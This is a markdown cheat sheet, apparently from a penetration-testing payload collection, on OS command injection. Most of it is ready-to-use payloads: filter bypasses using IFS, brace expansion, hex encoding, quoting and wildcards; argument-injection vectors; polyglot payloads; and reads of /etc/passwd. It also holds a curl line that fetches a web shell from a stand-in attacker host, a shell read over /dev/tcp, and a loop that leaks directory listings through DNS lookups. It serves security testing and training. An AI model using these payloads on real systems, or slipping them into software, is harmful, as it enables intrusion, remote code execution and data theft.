# Command Injection

> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Basic Commands](#basic-commands)
    * [Chaining Commands](#chaining-commands)
    * [Argument Injection](#argument-injection)
    * [Inside A Command](#inside-a-command)
* [Filter Bypasses](#filter-bypasses)
    * [Bypass Without Space](#bypass-without-space)
    * [Bypass With A Line Return](#bypass-with-a-line-return)
    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
    * [Bypass Characters Filter](#bypass-characters-filter)
    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
    * [Bypass With Single Quote](#bypass-with-single-quote)
    * [Bypass With Double Quote](#bypass-with-double-quote)
    * [Bypass With Backticks](#bypass-with-backticks)
    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)
    * [Bypass With $@](#bypass-with-)
    * [Bypass With $()](#bypass-with--1)
    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
    * [Bypass With Wildcards](#bypass-with-wildcards)
* [Data Exfiltration](#data-exfiltration)
    * [Time Based Data Exfiltration](#time-based-data-exfiltration)
    * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
* [Polyglot Command Injection](#polyglot-command-injection)
* [Tricks](#tricks)
    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)
    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)
* [Labs](#labs)
    * [Challenge](#challenge)
* [References](#references)


## Tools

* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool
* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library


## Methodology

Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.

The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.

**Example of Command Injection with PHP**:    
Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:

```php
<?php
    $ip = $_GET['ip'];
    system("ping -c 4 " . $ip);
?>
```

In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.

If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.

This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.


### Basic Commands

Execute the command and voila :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
...
```


### Chaining Commands

In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 


* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.

```powershell
command1; command2   # Execute command1 and then command2
command1 && command2 # Execute command2 only if command1 succeeds
command1 || command2 # Execute command2 only if command1 fails
command1 & command2  # Execute command1 in the background
command1 | command2  # Pipe the output of command1 into command2
```


### Argument Injection

Gain a command execution when you can only append arguments to an existing command.
Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.

* Chrome
    ```ps1
    chrome '--gpu-launcher="id>/tmp/foo"'
    ```

* SSH
    ```ps1
    ssh '-oProxyCommand="touch /tmp/foo"' foo@foo
    ```

* psql
    ```ps1
    psql -o'|id>/tmp/foo'
    ```

Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.

In the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02) instead of the **regular double quotes** (U+0022)

```php
$url = "https://example.tld/" . $_GET['path'] . ".txt";
system("wget.exe -q " . escapeshellarg($url));
```

Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.

* curl
    ```ps1
    # -o, --output <file>        Write to file instead of stdout
    curl http://evil.attacker.com/ -o webshell.php
    ```
    

### Inside A Command

* Command injection using backticks. 
  ```bash
  original_cmd_by_server `cat /etc/passwd`
  ```
* Command injection using substitution
  ```bash
  original_cmd_by_server $(cat /etc/passwd)
  ```


## Filter Bypasses

### Bypass Without Space

* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
  ```powershell
  cat${IFS}/etc/passwd
  ls${IFS}-la
  ```
* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
  ```powershell
  {cat,/etc/passwd}
  ```
* Input redirection. The < character tells the shell to read the contents of the file specified. 
  ```powershell
  cat</etc/passwd
  sh</dev/tcp/127.0.0.1/4242
  ```
* ANSI-C Quoting 
  ```powershell
  X=$'uname\x20-a'&&$X
  ```
* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
  ```powershell
  ;ls%09-al%09/home
  ```
* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
  ```powershell
  ping%CommonProgramFiles:~10,-18%127.0.0.1
  ping%PROGRAMFILES:~10,-5%127.0.0.1
  ```


### Bypass With A Line Return

Commands can also be run in sequence with newlines

```bash
original_cmd_by_server
ls
```


### Bypass With Backslash Newline

* Commands can be broken into parts by using backslash followed by a newline
  ```powershell
  $ cat /et\
  c/pa\
  sswd
  ```
* URL encoded form would look like this:
  ```powershell
  cat%20/et%5C%0Ac/pa%5C%0Asswd
  ```


### Bypass With Tilde Expansion

```powershell
echo ~+
echo ~-
```

### Bypass With Brace Expansion

```powershell
{,ip,a}
{,ifconfig}
{,ifconfig,eth0}
{l,-lh}s
{,echo,#test}
{,$"whoami",}
{,/?s?/?i?/c?t,/e??/p??s??,}
```


### Bypass Characters Filter

Commands execution without backslash and slash - linux bash

```powershell
swissky@crashlab:~$ echo ${HOME:0:1}
/

swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ echo . | tr '!-0' '"-1'
/

swissky@crashlab:~$ tr '!-0' '"-1' <<< .
/

swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
root:x:0:0:root:/root:/bin/bash
```

### Bypass Characters Filter Via Hex Encoding

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
/etc/passwd

swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
root:x:0:0:root:/root:/bin/bash
```

### Bypass With Single Quote

```powershell
w'h'o'am'i
wh''oami
'w'hoami
```

### Bypass With Double Quote

```powershell
w"h"o"am"i
wh""oami
"wh"oami
```

### Bypass With Backticks

```powershell
wh``oami
```

### Bypass With Backslash and Slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

### Bypass With $@

`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.

```powershell
who$@ami
echo whoami|$0
```


### Bypass With $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```

### Bypass With Variable Expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

### Bypass With Wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```


## Data Exfiltration

### Time Based Data Exfiltration

Extracting data char by char and detect the correct value based on the delay.

* Correct value: wait 5 seconds
  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
  real    0m5.007s
  user    0m0.000s
  sys 0m0.000s
  ```

* Incorrect value: no delay
  ```powershell
  swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
  real    0m0.002s
  user    0m0.000s
  sys 0m0.000s
  ```


### Dns Based Data Exfiltration

Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)

1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
  ```powershell
  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
  ```

Online tools to check for DNS based data exfiltration:

- http://dnsbin.zhack.ca/
- https://app.interactsh.com/
- Burp Collaborator


## Polyglot Command Injection

A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.

* Example 1:
  ```powershell
  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

  # Context inside commands with single and double quote:
  echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
  ```
* Example 2: 
  ```powershell
  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

  # Context inside commands with single and double quote:
  echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
  echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
  echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
  ```


## Tricks

### Backgrounding Long Running Commands

In some instances, you might have a long running command that gets killed by the process injecting it timing out.
Using `nohup`, you can keep the process running after the parent process exits.

```bash
nohup sleep 120 > /dev/null &
```

### Remove Arguments After The Injection

In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.


## Labs

* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
* [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
* [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
* [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
* [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
* [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
* [Root Me - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
* [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
* [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

### Challenge

Challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

**NOTE**: The command is safe to run, but you should not trust me.


## References

- [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
- [Argument Injection Vectors - SonarSource - February 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
- [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://www.exploit-db.com/papers/33930)
- [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://twitter.com/DissectMalware/status/1025604382644232192)
- [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
- [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://twitter.com/asdizzle_/status/895244943526170628)
- [OS Command Injection - PortSwigger - 2024](https://portswigger.net/web-security/os-command-injection)
- [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
- [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
- [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)